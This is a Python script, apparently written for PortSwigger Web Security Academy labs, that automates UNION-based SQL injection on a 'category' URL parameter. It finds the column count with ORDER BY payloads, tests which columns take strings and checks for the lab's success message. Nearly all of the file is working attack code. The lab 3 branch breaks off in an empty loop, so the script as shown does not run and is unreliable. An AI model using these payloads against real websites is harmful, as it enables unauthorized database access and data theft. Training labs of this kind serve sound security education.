#created to be used with Portswigger WebSec Academy
#replace url with lab url similar to one seen below
import requests
#url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
url = 'https://ac961f3b1e0d5ca28005bf7c0039009a.web-security-academy.net/filter?category=Accessories'
sqli_row = ["'+ORDER+BY+",
            "'+UNION+SELECT+"]
used_attack_r = []
lab = 2 # enter the lab numner to perform the correct lab check
nulls = ""
valid_rows = 0
final_attack = ""
compatible_col = []
session = requests.Session()

try:
    r = session.get(url=url)
except Exception as e:
    print(e)
    exit()

def find_rows():
    global nulls,valid_rows,r, final_attack
    if r.status_code == 200:
        for x in range(1,100):
            attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
            used_attack_r.append(attack_url)
            r = session.get(url=attack_url)
            if r.status_code == 500:
                valid_rows = x-1
                print("Valid number of columns is:",x-1)
                #print(used_attack_r[x-2])
                for y in range(x-1):
                    nulls += "NULL,"
                final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
                #print(final_attack)
                break

def check_columns():
    global r, final_attack, compatible_col
    for x in range(valid_rows):
        s = final_attack.split(',')
        s[x] = s[x].replace('NULL', "'a'")
        r = session.get(url=(',').join(s))
        if r.status_code == 200:
            compatible_col.append(x)
            print("Column %s is comaptible" % str(x+1))
    split = final_attack.split(",")
    for each in compatible_col:
        split[each] = split[each].replace('NULL', "'a'")
    final_attack = (',').join(split)
    #print(final_attack)

def pass_lab_check():
    if lab == 1:
        print(final_attack)
        r = session.get(url=final_attack)
        if "Congratulations, you solved the lab!" in r.text:
            print("lab 1 passed")
    elif lab == 2:
        #print(final_attack.replace("'a'","'drYPYM'")) #replace with required string from lab2
        r = session.get(url=final_attack.replace("'a'","'drYPYM'"))#replace with required string from lab2
        if "Congratulations, you solved the lab!" in r.text:
            print("lab 2 passed")
    elif lab == 3:
        split = final_attack.split(",")
        for each in compatible_col:
            
def main():
    find_rows()
    if lab != 1:
        print('checking columns')
        check_columns()
    pass_lab_check()

if __name__ == '__main__':
    main()
